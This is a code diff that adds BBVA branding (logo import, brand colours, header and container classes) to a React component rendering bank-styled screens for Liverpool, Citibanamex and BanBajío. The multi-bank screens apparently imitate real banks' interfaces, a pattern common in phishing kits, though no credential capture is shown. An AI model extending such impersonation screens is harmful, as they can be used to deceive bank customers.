@@ -6,6 +6,7 @@ import { ScreenType } from '@shared/schema';
 import liverpoolLogo from '../../assets/pngwing.com 2.png';
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
+import bbvaLogo from '@assets/bbva_logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -349,6 +350,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className={`h-full ${
                 banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
+                banco === 'BBVA' ? 'bg-[#072146]' :
                 'bg-[#e10098]'
               } animate-progress-bar`}></div>
             </div>
@@ -375,6 +377,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANBAJIO':
         return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
+      case 'BBVA':
+        return 'bg-[#072146] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
@@ -388,6 +392,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
       case 'BANBAJIO':
         return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
+      case 'BBVA':
+        return <img src={bbvaLogo} alt="BBVA" className="h-16 mx-auto mb-4" />;
       default:
         return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
     }
@@ -398,6 +404,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     switch(banco) {
       case 'BANBAJIO': return 'banbajio-header';
       case 'CITIBANAMEX': return 'citibanamex-header';
+      case 'BBVA': return 'bbva-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
     }
   };
@@ -407,6 +414,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     switch(banco) {
       case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
       case 'CITIBANAMEX': return 'citibanamex-container';
+      case 'BBVA': return 'bbva-container';
       default: return '';
     }
   };
